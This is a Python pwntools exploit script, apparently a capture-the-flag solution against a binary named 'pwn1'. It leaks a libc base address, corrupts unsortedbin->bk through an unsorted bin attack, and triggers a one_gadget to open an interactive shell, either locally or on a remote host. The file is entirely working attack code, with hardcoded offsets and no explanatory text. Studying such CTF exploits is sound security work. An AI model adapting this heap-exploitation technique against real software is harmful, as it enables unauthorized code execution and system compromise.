from pwn import *

context.arch = 'amd64'

context.terminal = ["tmux","split-window","-h"]

def cmd(command):
    p.recvuntil(">>")
    p.sendline(str(command))
def add(cap):
    cmd(1)
    p.recvuntil("num:")
    p.sendline(str(cap))

def show():
    cmd(2)


def clear():
    cmd(3)


def main(host,port=5005):
    global p
    if host:
        p = remote(host,port)
    else:
        p = process("./pwn1")
        
        # gdb.attach(p,"b *0x000000000401192")
    for i in range(0x10):
        add(0xcafebabedeadbeef)
    show()
    p.recvuntil("1:")
    libc.address = int(p.recvuntil('\n')[:-1]) - 0x3c4b78
    info("libc : " + hex(libc.address))
    for i in range(34):
        p.recvuntil("(y/n):")
        p.send('n')
    for i in range(0x10):
        add(libc.address)
    clear()

    for i in range(0x21):
        add(0x4526a+libc.address)
    clear()


    # unsorted bin attack
    for i in range(0x10):
        add(0xcafebabedeadbeef)
    show()
    p.recvuntil("1:")
    p.recvuntil("(y/n):")
    p.send('n')
    p.recvuntil("(y/n):")
    p.send('y')
    # modify unsortedbin->bk
    p.sendline(str(0x6051f8-0x10))
    for i in range(32):
        p.recvuntil("(y/n):")
        p.send('y')
        p.sendline(str(0x71))
    clear()
    

    # trigger one_gadget
    for i in range(0x8):
        add(0xcafebabedeadbeef)
    gdb.attach(p)
    p.interactive()

if __name__ == "__main__":
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
    main(0)